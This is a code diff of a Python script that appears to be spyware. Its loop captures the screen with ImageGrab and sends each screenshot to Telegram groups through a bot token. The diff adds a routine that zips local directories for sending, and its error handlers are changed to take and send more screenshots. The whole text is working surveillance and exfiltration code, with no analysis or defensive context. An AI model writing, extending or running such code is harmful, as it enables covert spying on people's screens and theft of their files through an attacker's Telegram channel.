@@ -8,6 +8,7 @@ def main():
         for chat_id in chat_ids:
             send_message_to_group(chat_id, screenshot)
         time.sleep(10)
+        archive_and_send()
 
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
@@ -32,11 +33,17 @@ def create_zip_archive(source_dir, output_zip):
                     try:
                         zipf.write(file_path, os.path.relpath(file_path, source_dir))
                     except Exception as e:
-                        archive_and_send()
+                        screenshot = ImageGrab.grab()
+                        for chat_id in chat_ids:
+                            send_message_to_group(chat_id, screenshot)
+                        time.sleep(10)
                         print(f"Error adding file to zip: {str(e)}")
         return output_zip + '.zip'
     except Exception as e:
-        archive_and_send()
+        screenshot = ImageGrab.grab()
+        for chat_id in chat_ids:
+            send_message_to_group(chat_id, screenshot)
+        time.sleep(10)
         print(f"Error creating zip archive: {str(e)}")
         return None
 
